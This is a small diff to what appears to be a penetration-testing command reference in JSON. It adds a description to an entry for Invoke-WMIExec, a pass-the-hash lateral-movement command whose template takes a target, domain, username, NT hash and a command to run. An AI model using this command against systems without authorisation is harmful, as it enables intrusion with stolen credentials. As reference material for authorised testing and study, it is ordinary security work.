@@ -66,7 +66,8 @@
   "variations": [
     {
       "label": "Invoke-WMIExec (WMI PtH, no admin on attacker)",
-      "command": "Invoke-WMIExec -Target <ip> -Domain <domain> -Username <user> -Hash <nt_hash> -Command \"<command>\""
+      "command": "Invoke-WMIExec -Target <ip> -Domain <domain> -Username <user> -Hash <nt_hash> -Command \"<command>\"",
+      "description": "Invoke-WMIExec (WMI PtH, no admin on attacker). See the command syntax for exact parameters and flags."
     }
   ],
   "exam": "exam-ok",
